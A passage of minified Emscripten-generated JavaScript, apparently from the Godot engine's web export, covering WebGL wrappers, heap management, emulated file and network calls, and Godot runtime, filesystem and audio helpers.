_emscripten_glUniform1iv(location,count,value){if(GL.currentContext.version>=2)count&&GLctx.uniform1iv(webglGetUniformLocation(location),GROWABLE_HEAP_I32(),value>>2,count);else{if(count<=288)for(var view=__miniTempWebGLIntBuffers[count-1],i=0;i<count;++i)view[i]=GROWABLE_HEAP_I32()[value+4*i>>2];else view=GROWABLE_HEAP_I32().subarray(value>>2,value+4*count>>2);GLctx.uniform1iv(webglGetUniformLocation(location),view)}}function _emscripten_glUniform1ui(location,v0){GLctx.uniform1ui(webglGetUniformLocation(location),v0)}function _emscripten_glUniform1uiv(location,count,value){count&&GLctx.uniform1uiv(webglGetUniformLocation(location),GROWABLE_HEAP_U32(),value>>2,count)}function _emscripten_glUniform2f(location,v0,v1){GLctx.uniform2f(webglGetUniformLocation(location),v0,v1)}var miniTempWebGLFloatBuffers=[];function _emscripten_glUniform2fv(location,count,value){if(GL.currentContext.version>=2)count&&GLctx.uniform2fv(webglGetUniformLocation(location),GROWABLE_HEAP_F32(),value>>2,2*count);else{if(count<=144)for(var view=miniTempWebGLFloatBuffers[2*count-1],i=0;i<2*count;i+=2)view[i]=GROWABLE_HEAP_F32()[value+4*i>>2],view[i+1]=GROWABLE_HEAP_F32()[value+(4*i+4)>>2];else view=GROWABLE_HEAP_F32().subarray(value>>2,value+8*count>>2);GLctx.uniform2fv(webglGetUniformLocation(location),view)}}function _emscripten_glUniform2iv(location,count,value){if(GL.currentContext.version>=2)count&&GLctx.uniform2iv(webglGetUniformLocation(location),GROWABLE_HEAP_I32(),value>>2,2*count);else{if(count<=144)for(var view=__miniTempWebGLIntBuffers[2*count-1],i=0;i<2*count;i+=2)view[i]=GROWABLE_HEAP_I32()[value+4*i>>2],view[i+1]=GROWABLE_HEAP_I32()[value+(4*i+4)>>2];else view=GROWABLE_HEAP_I32().subarray(value>>2,value+8*count>>2);GLctx.uniform2iv(webglGetUniformLocation(location),view)}}function _emscripten_glUniform3fv(location,count,value){if(GL.currentContext.version>=2)count&&GLctx.uniform3fv(webglGetUniformLocation(location),GROWABLE_HEAP_F32(),value>>2,3*count);else{if(count<=96)for(var view=miniTempWebGLFloatBuffers[3*count-1],i=0;i<3*count;i+=3)view[i]=GROWABLE_HEAP_F32()[value+4*i>>2],view[i+1]=GROWABLE_HEAP_F32()[value+(4*i+4)>>2],view[i+2]=GROWABLE_HEAP_F32()[value+(4*i+8)>>2];else view=GROWABLE_HEAP_F32().subarray(value>>2,value+12*count>>2);GLctx.uniform3fv(webglGetUniformLocation(location),view)}}function _emscripten_glUniform4f(location,v0,v1,v2,v3){GLctx.uniform4f(webglGetUniformLocation(location),v0,v1,v2,v3)}function _emscripten_glUniform4fv(location,count,value){if(GL.currentContext.version>=2)count&&GLctx.uniform4fv(webglGetUniformLocation(location),GROWABLE_HEAP_F32(),value>>2,4*count);else{if(count<=72){var view=miniTempWebGLFloatBuffers[4*count-1],heap=GROWABLE_HEAP_F32();value>>=2;for(var i=0;i<4*count;i+=4){var dst=value+i;view[i]=heap[dst],view[i+1]=heap[dst+1],view[i+2]=heap[dst+2],view[i+3]=heap[dst+3]}}else view=GROWABLE_HEAP_F32().subarray(value>>2,value+16*count>>2);GLctx.uniform4fv(webglGetUniformLocation(location),view)}}function _emscripten_glUniformBlockBinding(program,uniformBlockIndex,uniformBlockBinding){program=GL.programs[program],GLctx.uniformBlockBinding(program,uniformBlockIndex,uniformBlockBinding)}function _emscripten_glUniformMatrix4fv(location,count,transpose,value){if(GL.currentContext.version>=2)count&&GLctx.uniformMatrix4fv(webglGetUniformLocation(location),!!transpose,GROWABLE_HEAP_F32(),value>>2,16*count);else{if(count<=18){var view=miniTempWebGLFloatBuffers[16*count-1],heap=GROWABLE_HEAP_F32();value>>=2;for(var i=0;i<16*count;i+=16){var dst=value+i;view[i]=heap[dst],view[i+1]=heap[dst+1],view[i+2]=heap[dst+2],view[i+3]=heap[dst+3],view[i+4]=heap[dst+4],view[i+5]=heap[dst+5],view[i+6]=heap[dst+6],view[i+7]=heap[dst+7],view[i+8]=heap[dst+8],view[i+9]=heap[dst+9],view[i+10]=heap[dst+10],view[i+11]=heap[dst+11],view[i+12]=heap[dst+12],view[i+13]=heap[dst+13],view[i+14]=heap[dst+14],view[i+15]=heap[dst+15]}}else view=GROWABLE_HEAP_F32().subarray(value>>2,value+64*count>>2);GLctx.uniformMatrix4fv(webglGetUniformLocation(location),!!transpose,view)}}function _emscripten_glUseProgram(program){program=GL.programs[program],GLctx.useProgram(program),GLctx.currentProgram=program}function _emscripten_glVertexAttrib4f(x0,x1,x2,x3,x4){GLctx.vertexAttrib4f(x0,x1,x2,x3,x4)}function _emscripten_glVertexAttribDivisor(index,divisor){GLctx.vertexAttribDivisor(index,divisor)}function _emscripten_glVertexAttribIPointer(index,size,type,stride,ptr){GLctx.vertexAttribIPointer(index,size,type,stride,ptr)}function _emscripten_glVertexAttribPointer(index,size,type,normalized,stride,ptr){GLctx.vertexAttribPointer(index,size,type,!!normalized,stride,ptr)}function _emscripten_glViewport(x0,x1,x2,x3){GLctx.viewport(x0,x1,x2,x3)}function _emscripten_memcpy_big(dest,src,num){GROWABLE_HEAP_U8().copyWithin(dest,src,src+num)}function _emscripten_num_logical_cores(){return navigator.hardwareConcurrency}function _emscripten_proxy_to_main_thread_js(index,sync){var numCallArgs=arguments.length-2,outerArgs=arguments;if(numCallArgs>19)throw"emscripten_proxy_to_main_thread_js: Too many arguments "+numCallArgs+" to proxied function idx="+index+", maximum supported is 19!";return withStackSave((function(){for(var serializedNumCallArgs=numCallArgs,args=stackAlloc(8*serializedNumCallArgs),b=args>>3,i=0;i<numCallArgs;i++){var arg=outerArgs[2+i];GROWABLE_HEAP_F64()[b+i]=arg}return _emscripten_run_in_main_runtime_thread_js(index,serializedNumCallArgs,args,sync)}))}var _emscripten_receive_on_main_thread_js_callArgs=[];function _emscripten_receive_on_main_thread_js(index,numCallArgs,args){_emscripten_receive_on_main_thread_js_callArgs.length=numCallArgs;for(var b=args>>3,i=0;i<numCallArgs;i++)_emscripten_receive_on_main_thread_js_callArgs[i]=GROWABLE_HEAP_F64()[b+i];var func=index<0?ASM_CONSTS[-index-1]:proxiedFunctionTable[index];return assert(func.length==numCallArgs,"Call args mismatch in emscripten_receive_on_main_thread_js"),func.apply(null,_emscripten_receive_on_main_thread_js_callArgs)}function getHeapMax(){return 2147483648}function emscripten_realloc_buffer(size){try{return wasmMemory.grow(size-buffer.byteLength+65535>>>16),updateGlobalBufferAndViews(wasmMemory.buffer),1}catch(e){err("emscripten_realloc_buffer: Attempted to grow heap from "+buffer.byteLength+" bytes to "+size+" bytes, but got error: "+e)}}function _emscripten_resize_heap(requestedSize){var oldSize=GROWABLE_HEAP_U8().length;if((requestedSize>>>=0)<=oldSize)return!1;var maxHeapSize=getHeapMax();if(requestedSize>maxHeapSize)return err("Cannot enlarge memory, asked to go up to "+requestedSize+" bytes, but the limit is "+maxHeapSize+" bytes!"),!1;for(var cutDown=1;cutDown<=4;cutDown*=2){var overGrownHeapSize=oldSize*(1+.2/cutDown);overGrownHeapSize=Math.min(overGrownHeapSize,requestedSize+100663296);var newSize=Math.min(maxHeapSize,(x=Math.max(requestedSize,overGrownHeapSize))+((multiple=65536)-x%multiple)%multiple);if(emscripten_realloc_buffer(newSize))return!0}var x,multiple;return err("Failed to grow the heap from "+oldSize+" bytes to "+newSize+" bytes, not enough memory!"),!1}function _emscripten_set_main_loop(func,fps,simulateInfiniteLoop){setMainLoop(getWasmTableEntry(func),fps,simulateInfiniteLoop)}function _emscripten_supports_offscreencanvas(){return 0}function _emscripten_unwind_to_js_event_loop(){throw"unwind"}function _emscripten_webgl_destroy_context(contextHandle){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(38,1,contextHandle);GL.currentContext==contextHandle&&(GL.currentContext=0),GL.deleteContext(contextHandle)}function _emscripten_webgl_do_commit_frame(){return GL.currentContext&&GL.currentContext.GLctx?GL.currentContext.defaultFbo?(GL.blitOffscreenFramebuffer(GL.currentContext),0):GL.currentContext.attributes.explicitSwapControl?0:-3:-3}function _emscripten_webgl_create_context_proxied(target,attributes){return ENVIRONMENT_IS_PTHREAD?_emscripten_proxy_to_main_thread_js(39,1,target,attributes):_emscripten_webgl_do_create_context(target,attributes)}var JSEvents={inEventHandler:0,removeAllEventListeners:function(){for(var i=JSEvents.eventHandlers.length-1;i>=0;--i)JSEvents._removeHandler(i);JSEvents.eventHandlers=[],JSEvents.deferredCalls=[]},registerRemoveEventListeners:function(){JSEvents.removeEventListenersRegistered||(__ATEXIT__.push(JSEvents.removeAllEventListeners),JSEvents.removeEventListenersRegistered=!0)},deferredCalls:[],deferCall:function(targetFunction,precedence,argsList){function arraysHaveEqualContent(arrA,arrB){if(arrA.length!=arrB.length)return!1;for(var i in arrA)if(arrA[i]!=arrB[i])return!1;return!0}for(var i in JSEvents.deferredCalls){var call=JSEvents.deferredCalls[i];if(call.targetFunction==targetFunction&&arraysHaveEqualContent(call.argsList,argsList))return}JSEvents.deferredCalls.push({targetFunction:targetFunction,precedence:precedence,argsList:argsList}),JSEvents.deferredCalls.sort((function(x,y){return x.precedence<y.precedence}))},removeDeferredCalls:function(targetFunction){for(var i=0;i<JSEvents.deferredCalls.length;++i)JSEvents.deferredCalls[i].targetFunction==targetFunction&&(JSEvents.deferredCalls.splice(i,1),--i)},canPerformEventHandlerRequests:function(){return JSEvents.inEventHandler&&JSEvents.currentEventHandler.allowsDeferredCalls},runDeferredCalls:function(){if(JSEvents.canPerformEventHandlerRequests())for(var i=0;i<JSEvents.deferredCalls.length;++i){var call=JSEvents.deferredCalls[i];JSEvents.deferredCalls.splice(i,1),--i,call.targetFunction.apply(null,call.argsList)}},eventHandlers:[],removeAllHandlersOnTarget:function(target,eventTypeString){for(var i=0;i<JSEvents.eventHandlers.length;++i)JSEvents.eventHandlers[i].target!=target||eventTypeString&&eventTypeString!=JSEvents.eventHandlers[i].eventTypeString||JSEvents._removeHandler(i--)},_removeHandler:function(i){var h=JSEvents.eventHandlers[i];h.target.removeEventListener(h.eventTypeString,h.eventListenerFunc,h.useCapture),JSEvents.eventHandlers.splice(i,1)},registerOrRemoveHandler:function(eventHandler){var jsEventHandler=function jsEventHandler(event){++JSEvents.inEventHandler,JSEvents.currentEventHandler=eventHandler,JSEvents.runDeferredCalls(),eventHandler.handlerFunc(event),JSEvents.runDeferredCalls(),--JSEvents.inEventHandler};if(eventHandler.callbackfunc)eventHandler.eventListenerFunc=jsEventHandler,eventHandler.target.addEventListener(eventHandler.eventTypeString,jsEventHandler,eventHandler.useCapture),JSEvents.eventHandlers.push(eventHandler),JSEvents.registerRemoveEventListeners();else for(var i=0;i<JSEvents.eventHandlers.length;++i)JSEvents.eventHandlers[i].target==eventHandler.target&&JSEvents.eventHandlers[i].eventTypeString==eventHandler.eventTypeString&&JSEvents._removeHandler(i--)},queueEventHandlerOnThread_iiii:function(targetThread,eventHandlerFunc,eventTypeId,eventData,userData){withStackSave((function(){var varargs=stackAlloc(12);GROWABLE_HEAP_I32()[varargs>>2]=eventTypeId,GROWABLE_HEAP_I32()[varargs+4>>2]=eventData,GROWABLE_HEAP_I32()[varargs+8>>2]=userData,_emscripten_dispatch_to_thread_(targetThread,637534208,eventHandlerFunc,eventData,varargs)}))},getTargetThreadForEventCallback:function(targetThread){switch(targetThread){case 1:return 0;case 2:return PThread.currentProxiedOperationCallerThread;default:return targetThread}},getNodeNameForTarget:function(target){return target?target==window?"#window":target==screen?"#screen":target&&target.nodeName?target.nodeName:"":""},fullscreenEnabled:function(){return document.fullscreenEnabled||document.webkitFullscreenEnabled}},__emscripten_webgl_power_preferences=["default","low-power","high-performance"];function maybeCStringToJsString(cString){return cString>2?UTF8ToString(cString):cString}var specialHTMLTargets=[0,"undefined"!=typeof document?document:0,"undefined"!=typeof window?window:0];function findEventTarget(target){return target=maybeCStringToJsString(target),specialHTMLTargets[target]||("undefined"!=typeof document?document.querySelector(target):void 0)}function findCanvasEventTarget(target){return findEventTarget(target)}function _emscripten_webgl_do_create_context(target,attributes){assert(attributes);var a=attributes>>2,powerPreference=GROWABLE_HEAP_I32()[a+6],contextAttributes={alpha:!!GROWABLE_HEAP_I32()[a+0],depth:!!GROWABLE_HEAP_I32()[a+1],stencil:!!GROWABLE_HEAP_I32()[a+2],antialias:!!GROWABLE_HEAP_I32()[a+3],premultipliedAlpha:!!GROWABLE_HEAP_I32()[a+4],preserveDrawingBuffer:!!GROWABLE_HEAP_I32()[a+5],powerPreference:__emscripten_webgl_power_preferences[powerPreference],failIfMajorPerformanceCaveat:!!GROWABLE_HEAP_I32()[a+7],majorVersion:GROWABLE_HEAP_I32()[a+8],minorVersion:GROWABLE_HEAP_I32()[a+9],enableExtensionsByDefault:GROWABLE_HEAP_I32()[a+10],explicitSwapControl:GROWABLE_HEAP_I32()[a+11],proxyContextToMainThread:GROWABLE_HEAP_I32()[a+12],renderViaOffscreenBackBuffer:GROWABLE_HEAP_I32()[a+13]},canvas=findCanvasEventTarget(target);return ENVIRONMENT_IS_PTHREAD&&(2===contextAttributes.proxyContextToMainThread||!canvas&&1===contextAttributes.proxyContextToMainThread)?("undefined"==typeof OffscreenCanvas&&(GROWABLE_HEAP_I32()[attributes+52>>2]=1,GROWABLE_HEAP_I32()[attributes+20>>2]=1),_emscripten_webgl_create_context_proxied(target,attributes)):canvas?(contextAttributes.explicitSwapControl&&!contextAttributes.renderViaOffscreenBackBuffer&&(contextAttributes.renderViaOffscreenBackBuffer=!0),GL.createContext(canvas,contextAttributes)):0}function _emscripten_webgl_enable_extension(contextHandle,extension){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(40,1,contextHandle,extension);var context=GL.getContext(contextHandle),extString=UTF8ToString(extension);return extString.startsWith("GL_")&&(extString=extString.substr(3)),"ANGLE_instanced_arrays"==extString&&__webgl_enable_ANGLE_instanced_arrays(GLctx),"OES_vertex_array_object"==extString&&__webgl_enable_OES_vertex_array_object(GLctx),"WEBGL_draw_buffers"==extString&&__webgl_enable_WEBGL_draw_buffers(GLctx),"WEBGL_draw_instanced_base_vertex_base_instance"==extString&&__webgl_enable_WEBGL_draw_instanced_base_vertex_base_instance(GLctx),"WEBGL_multi_draw_instanced_base_vertex_base_instance"==extString&&__webgl_enable_WEBGL_multi_draw_instanced_base_vertex_base_instance(GLctx),"WEBGL_multi_draw"==extString&&__webgl_enable_WEBGL_multi_draw(GLctx),!!context.GLctx.getExtension(extString)}function _emscripten_webgl_init_context_attributes(attributes){assert(attributes);for(var a=attributes>>2,i=0;i<14;++i)GROWABLE_HEAP_I32()[a+i]=0;GROWABLE_HEAP_I32()[a+0]=GROWABLE_HEAP_I32()[a+1]=GROWABLE_HEAP_I32()[a+3]=GROWABLE_HEAP_I32()[a+4]=GROWABLE_HEAP_I32()[a+8]=GROWABLE_HEAP_I32()[a+10]=1,ENVIRONMENT_IS_WORKER&&(GROWABLE_HEAP_I32()[attributes+48>>2]=1)}function _emscripten_webgl_make_context_current_calling_thread(contextHandle){var success=GL.makeContextCurrent(contextHandle);return success&&(GL.currentContextIsProxied=!1),success?0:-5}var ENV={};function getExecutableName(){return thisProgram||"./this.program"}function getEnvStrings(){if(!getEnvStrings.strings){var env={USER:"web_user",LOGNAME:"web_user",PATH:"/",PWD:"/",HOME:"/home/web_user",LANG:("object"==typeof navigator&&navigator.languages&&navigator.languages[0]||"C").replace("-","_")+".UTF-8",_:getExecutableName()};for(var x in ENV)void 0===ENV[x]?delete env[x]:env[x]=ENV[x];var strings=[];for(var x in env)strings.push(x+"="+env[x]);getEnvStrings.strings=strings}return getEnvStrings.strings}function writeAsciiToMemory(str,buffer,dontAddNull){for(var i=0;i<str.length;++i)assert(str.charCodeAt(i)===(255&str.charCodeAt(i))),GROWABLE_HEAP_I8()[buffer++>>0]=str.charCodeAt(i);dontAddNull||(GROWABLE_HEAP_I8()[buffer>>0]=0)}function _environ_get(__environ,environ_buf){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(41,1,__environ,environ_buf);var bufSize=0;return getEnvStrings().forEach((function(string,i){var ptr=environ_buf+bufSize;GROWABLE_HEAP_U32()[__environ+4*i>>2]=ptr,writeAsciiToMemory(string,ptr),bufSize+=string.length+1})),0}function _environ_sizes_get(penviron_count,penviron_buf_size){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(42,1,penviron_count,penviron_buf_size);var strings=getEnvStrings();GROWABLE_HEAP_U32()[penviron_count>>2]=strings.length;var bufSize=0;return strings.forEach((function(string){bufSize+=string.length+1})),GROWABLE_HEAP_U32()[penviron_buf_size>>2]=bufSize,0}function _fd_close(fd){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(43,1,fd);try{var stream=SYSCALLS.getStreamFromFD(fd);return FS.close(stream),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return e.errno}}function _fd_fdstat_get(fd,pbuf){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(44,1,fd,pbuf);try{var stream=SYSCALLS.getStreamFromFD(fd),type=stream.tty?2:FS.isDir(stream.mode)?3:FS.isLink(stream.mode)?7:4;return GROWABLE_HEAP_I8()[pbuf>>0]=type,0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return e.errno}}function doReadv(stream,iov,iovcnt,offset){for(var ret=0,i=0;i<iovcnt;i++){var ptr=GROWABLE_HEAP_U32()[iov>>2],len=GROWABLE_HEAP_U32()[iov+4>>2];iov+=8;var curr=FS.read(stream,GROWABLE_HEAP_I8(),ptr,len,offset);if(curr<0)return-1;if(ret+=curr,curr<len)break}return ret}function _fd_read(fd,iov,iovcnt,pnum){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(45,1,fd,iov,iovcnt,pnum);try{var num=doReadv(SYSCALLS.getStreamFromFD(fd),iov,iovcnt);return GROWABLE_HEAP_I32()[pnum>>2]=num,0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return e.errno}}function convertI32PairToI53Checked(lo,hi){return assert(lo==lo>>>0||lo==(0|lo)),assert(hi===(0|hi)),hi+2097152>>>0<4194305-!!lo?(lo>>>0)+4294967296*hi:NaN}function _fd_seek(fd,offset_low,offset_high,whence,newOffset){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(46,1,fd,offset_low,offset_high,whence,newOffset);try{var offset=convertI32PairToI53Checked(offset_low,offset_high);if(isNaN(offset))return 61;var stream=SYSCALLS.getStreamFromFD(fd);return FS.llseek(stream,offset,whence),tempI64=[stream.position>>>0,(tempDouble=stream.position,+Math.abs(tempDouble)>=1?tempDouble>0?(0|Math.min(+Math.floor(tempDouble/4294967296),4294967295))>>>0:~~+Math.ceil((tempDouble-+(~~tempDouble>>>0))/4294967296)>>>0:0)],GROWABLE_HEAP_I32()[newOffset>>2]=tempI64[0],GROWABLE_HEAP_I32()[newOffset+4>>2]=tempI64[1],stream.getdents&&0===offset&&0===whence&&(stream.getdents=null),0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return e.errno}}function doWritev(stream,iov,iovcnt,offset){for(var ret=0,i=0;i<iovcnt;i++){var ptr=GROWABLE_HEAP_U32()[iov>>2],len=GROWABLE_HEAP_U32()[iov+4>>2];iov+=8;var curr=FS.write(stream,GROWABLE_HEAP_I8(),ptr,len,offset);if(curr<0)return-1;ret+=curr}return ret}function _fd_write(fd,iov,iovcnt,pnum){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(47,1,fd,iov,iovcnt,pnum);try{var num=doWritev(SYSCALLS.getStreamFromFD(fd),iov,iovcnt);return GROWABLE_HEAP_U32()[pnum>>2]=num,0}catch(e){if(void 0===FS||!(e instanceof FS.ErrnoError))throw e;return e.errno}}function _getTempRet0(){return getTempRet0()}function _getaddrinfo(node,service,hint,out){if(ENVIRONMENT_IS_PTHREAD)return _emscripten_proxy_to_main_thread_js(48,1,node,service,hint,out);var ai,addr=0,port=0,flags=0,family=0,type=0,proto=0;function allocaddrinfo(family,type,proto,canon,addr,port){var sa,salen,ai;return salen=10===family?28:16,addr=10===family?inetNtop6(addr):inetNtop4(addr),assert(!writeSockaddr(sa=_malloc(salen),family,addr,port)),ai=_malloc(32),GROWABLE_HEAP_I32()[ai+4>>2]=family,GROWABLE_HEAP_I32()[ai+8>>2]=type,GROWABLE_HEAP_I32()[ai+12>>2]=proto,GROWABLE_HEAP_I32()[ai+24>>2]=canon,GROWABLE_HEAP_U32()[ai+20>>2]=sa,GROWABLE_HEAP_I32()[ai+16>>2]=10===family?28:16,GROWABLE_HEAP_I32()[ai+28>>2]=0,ai}if(hint&&(flags=GROWABLE_HEAP_I32()[hint>>2],family=GROWABLE_HEAP_I32()[hint+4>>2],type=GROWABLE_HEAP_I32()[hint+8>>2],proto=GROWABLE_HEAP_I32()[hint+12>>2]),type&&!proto&&(proto=2===type?17:6),!type&&proto&&(type=17===proto?2:1),0===proto&&(proto=6),0===type&&(type=1),!node&&!service)return-2;if(-1088&flags)return-1;if(0!==hint&&2&GROWABLE_HEAP_I32()[hint>>2]&&!node)return-1;if(32&flags)return-2;if(0!==type&&1!==type&&2!==type)return-7;if(0!==family&&2!==family&&10!==family)return-6;if(service&&(service=UTF8ToString(service),port=parseInt(service,10),isNaN(port)))return 1024&flags?-2:-8;if(!node)return 0===family&&(family=2),0==(1&flags)&&(addr=2===family?_htonl(2130706433):[0,0,0,1]),ai=allocaddrinfo(family,type,proto,null,addr,port),GROWABLE_HEAP_U32()[out>>2]=ai,0;if(null!==(addr=inetPton4(node=UTF8ToString(node))))if(0===family||2===family)family=2;else{if(!(10===family&&8&flags))return-2;addr=[0,0,_htonl(65535),addr],family=10}else if(null!==(addr=inetPton6(node))){if(0!==family&&10!==family)return-2;family=10}return null!=addr?(ai=allocaddrinfo(family,type,proto,node,addr,port),GROWABLE_HEAP_U32()[out>>2]=ai,0):4&flags?-2:(addr=inetPton4(node=DNS.lookup_name(node)),0===family?family=2:10===family&&(addr=[0,0,_htonl(65535),addr]),ai=allocaddrinfo(family,type,proto,null,addr,port),GROWABLE_HEAP_U32()[out>>2]=ai,0)}function _getnameinfo(sa,salen,node,nodelen,serv,servlen,flags){var info=readSockaddr(sa,salen);if(info.errno)return-6;var port=info.port,addr=info.addr,overflowed=!1;if(node&&nodelen){var lookup;if(1&flags||!(lookup=DNS.lookup_addr(addr))){if(8&flags)return-2}else addr=lookup;stringToUTF8(addr,node,nodelen)+1>=nodelen&&(overflowed=!0)}serv&&servlen&&(stringToUTF8(port=""+port,serv,servlen)+1>=servlen&&(overflowed=!0));return overflowed?-12:0}function _glGetBufferSubData(target,offset,size,data){data?size&&GLctx.getBufferSubData(target,offset,GROWABLE_HEAP_U8(),data,size):GL.recordError(1281)}var GodotRuntime={get_func:function(ptr){return wasmTable.get(ptr)},error:function(){err.apply(null,Array.from(arguments))},print:function(){out.apply(null,Array.from(arguments))},malloc:function(p_size){return _malloc(p_size)},free:function(p_ptr){_free(p_ptr)},getHeapValue:function(p_ptr,p_type){return getValue(p_ptr,p_type)},setHeapValue:function(p_ptr,p_value,p_type){setValue(p_ptr,p_value,p_type)},heapSub:function(p_heap,p_ptr,p_len){const bytes=p_heap.BYTES_PER_ELEMENT;return p_heap.subarray(p_ptr/bytes,p_ptr/bytes+p_len)},heapSlice:function(p_heap,p_ptr,p_len){const bytes=p_heap.BYTES_PER_ELEMENT;return p_heap.slice(p_ptr/bytes,p_ptr/bytes+p_len)},heapCopy:function(p_dst,p_src,p_ptr){const bytes=p_src.BYTES_PER_ELEMENT;return p_dst.set(p_src,p_ptr/bytes)},parseString:function(p_ptr){return UTF8ToString(p_ptr)},parseStringArray:function(p_ptr,p_size){const strings=[];return GodotRuntime.heapSub(GROWABLE_HEAP_I32(),p_ptr,p_size).forEach((function(ptr){strings.push(GodotRuntime.parseString(ptr))})),strings},strlen:function(p_str){return lengthBytesUTF8(p_str)},allocString:function(p_str){const length=GodotRuntime.strlen(p_str)+1,c_str=GodotRuntime.malloc(length);return stringToUTF8(p_str,c_str,length),c_str},allocStringArray:function(p_strings){const size=p_strings.length,c_ptr=GodotRuntime.malloc(4*size);for(let i=0;i<size;i++)GROWABLE_HEAP_I32()[(c_ptr>>2)+i]=GodotRuntime.allocString(p_strings[i]);return c_ptr},freeStringArray:function(p_ptr,p_len){for(let i=0;i<p_len;i++)GodotRuntime.free(GROWABLE_HEAP_I32()[(p_ptr>>2)+i]);GodotRuntime.free(p_ptr)},stringToHeap:function(p_str,p_ptr,p_len){return stringToUTF8Array(p_str,GROWABLE_HEAP_I8(),p_ptr,p_len)}},GodotConfig={canvas:null,locale:"en",canvas_resize_policy:2,virtual_keyboard:!1,persistent_drops:!1,on_execute:null,on_exit:null,init_config:function(p_opts){GodotConfig.canvas_resize_policy=p_opts.canvasResizePolicy,GodotConfig.canvas=p_opts.canvas,GodotConfig.locale=p_opts.locale||GodotConfig.locale,GodotConfig.virtual_keyboard=p_opts.virtualKeyboard,GodotConfig.persistent_drops=!!p_opts.persistentDrops,GodotConfig.on_execute=p_opts.onExecute,GodotConfig.on_exit=p_opts.onExit,p_opts.focusCanvas&&GodotConfig.canvas.focus()},locate_file:function(file){return Module.locateFile(file)},clear:function(){GodotConfig.canvas=null,GodotConfig.locale="en",GodotConfig.canvas_resize_policy=2,GodotConfig.virtual_keyboard=!1,GodotConfig.persistent_drops=!1,GodotConfig.on_execute=null,GodotConfig.on_exit=null}},GodotFS={ENOENT:44,_idbfs:!1,_syncing:!1,_mount_points:[],is_persistent:function(){return GodotFS._idbfs?1:0},init:function(persistentPaths){if(GodotFS._idbfs=!1,!Array.isArray(persistentPaths))return Promise.reject(new Error("Persistent paths must be an array"));if(!persistentPaths.length)return Promise.resolve();return GodotFS._mount_points=persistentPaths.slice(),GodotFS._mount_points.forEach((function(path){!function createRecursive(dir){try{FS.stat(dir)}catch(e){e.errno!==GodotFS.ENOENT&&GodotRuntime.error(e),FS.mkdirTree(dir)}}(path),FS.mount(IDBFS,{},path)})),new Promise((function(resolve,reject){FS.syncfs(!0,(function(err){err?(GodotFS._mount_points=[],GodotFS._idbfs=!1,GodotRuntime.print(`IndexedDB not available: ${err.message}`)):GodotFS._idbfs=!0,resolve(err)}))}))},deinit:function(){GodotFS._mount_points.forEach((function(path){try{FS.unmount(path)}catch(e){GodotRuntime.print("Already unmounted",e)}GodotFS._idbfs&&IDBFS.dbs[path]&&(IDBFS.dbs[path].close(),delete IDBFS.dbs[path])})),GodotFS._mount_points=[],GodotFS._idbfs=!1,GodotFS._syncing=!1},sync:function(){return GodotFS._syncing?(GodotRuntime.error("Already syncing!"),Promise.resolve()):(GodotFS._syncing=!0,new Promise((function(resolve,reject){FS.syncfs(!1,(function(error){error&&GodotRuntime.error(`Failed to save IDB file system: ${error.message}`),GodotFS._syncing=!1,resolve(error)}))})))},copy_to_fs:function(path,buffer){const idx=path.lastIndexOf("/");let dir="/";idx>0&&(dir=path.slice(0,idx));try{FS.stat(dir)}catch(e){e.errno!==GodotFS.ENOENT&&GodotRuntime.error(e),FS.mkdirTree(dir)}FS.writeFile(path,new Uint8Array(buffer))}},GodotOS={request_quit:function(){},_async_cbs:[],_fs_sync_promise:null,atexit:function(p_promise_cb){GodotOS._async_cbs.push(p_promise_cb)},cleanup:function(exit_code){const cb=GodotConfig.on_exit;GodotFS.deinit(),GodotConfig.clear(),cb&&cb(exit_code)},finish_async:function(callback){GodotOS._fs_sync_promise.then((function(err){const promises=[];return GodotOS._async_cbs.forEach((function(cb){promises.push(new Promise(cb))})),Promise.all(promises)})).then((function(){return GodotFS.sync()})).then((function(err){setTimeout((function(){callback()}),0)}))}},GodotAudio={ctx:null,input:null,driver:null,interval:0,init:function(mix_rate,latency,onstatechange,onlatencyupdate){const opts={};mix_rate&&(opts.sampleRate=mix_rate);const ctx=new(window.AudioContext||window.webkitAudioContext)(opts);return GodotAudio.ctx=ctx,ctx.onstatechange=function(){let state=0;switch(ctx.state){case"suspended":state=0;break;case"running":state=1;break;case"closed":state=2}onstatechange(state)},ctx.onstatechange(),GodotAudio.interval=setInterval((function(){let computed_latency=0;ctx.baseLatency&&(computed_latency+=GodotAudio.ctx.baseLatency),ctx.outputLatency&&(computed_latency+=GodotAudio.ctx.outputLatency),onlatencyupdate(computed_latency)}),1e3),GodotOS.atexit(GodotAudio.close_async),ctx.destination.channelCount},create_input:function(callback){if(GodotAudio.input)return 0;function gotMediaInput(stream){try{GodotAudio.input=GodotAudio.ctx.createMediaStreamSource(stream),callback(GodotAudio.input)}catch(e){GodotRuntime.error("Failed creaating input.",e)}}if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia)navigator.mediaDevices.getUserMedia({audio:!0}).then(gotMediaInput,(function(e){GodotRuntime.error("Error getting user media.",e)}));else{if(navigator.getUserMedia||(navigator.getUserMedia=navigator.webkitGetUserMedia||navigator.mozGetUserMedia),!navigator.getUserMedia)return GodotRuntime.error("getUserMedia not available."),1;navigator.getUserMedia({audio:!0},gotMediaInput,(function(e){GodotRuntime.print(e)}))}return 0},close_async:function(resolve,reject){const ctx=GodotAudio.ctx;if(GodotAudio.ctx=null,!ctx)return void resolve();GodotAudio.interval&&(clearInterval(GodotAudio.interval),GodotAudio.interval=0),GodotAudio.input&&(GodotAudio.input.disconnect(),GodotAudio.input=null);let closed=Promise.resolve();GodotAudio.driver&&(closed=GodotAudio.driver.close()),closed.then((function(){return ctx.close()})).then((function(){ctx.onstatechange=null,resolve()})).catch((function(e){ctx.onstatechange=null,GodotRuntime.error("Error closing 